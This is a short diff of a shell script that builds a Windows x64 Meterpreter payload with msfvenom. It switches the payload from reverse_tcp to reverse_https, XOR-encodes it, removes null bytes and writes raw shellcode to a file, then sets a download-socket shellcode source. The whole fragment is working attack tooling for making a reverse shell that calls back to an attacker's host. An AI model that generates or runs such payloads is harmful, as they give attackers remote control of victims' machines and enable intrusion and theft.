@@ -23,7 +23,7 @@ LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
 
 # make meterpreter reverse payload
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x64/xor -b '\x00' -f raw --platform Windows > output/thepayload.bin
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -b '\x00' -f raw --platform Windows > output/thepayload.bin
 
 # set shellcode source
 set_shellcode_source download_socket
